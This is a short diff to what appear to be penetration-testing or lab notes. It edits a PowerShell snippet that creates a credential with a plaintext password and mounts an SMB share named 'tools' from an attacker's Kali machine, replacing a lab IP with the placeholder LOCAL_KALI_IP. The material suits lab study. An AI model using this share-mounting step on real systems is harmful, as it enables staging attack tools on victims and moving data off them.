@@ -121,7 +121,7 @@ localhost
 ``` 
 $pass = convertto-securestring 'password1' -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential('dials', $pass)
-New-PSDrive -Name dials -PSProvider FileSystem -Credential $cred -Root \\10.10.14.52\tools
+New-PSDrive -Name dials -PSProvider FileSystem -Credential $cred -Root \\LOCAL_KALI_IP\tools
 cd dials:
 ```
 
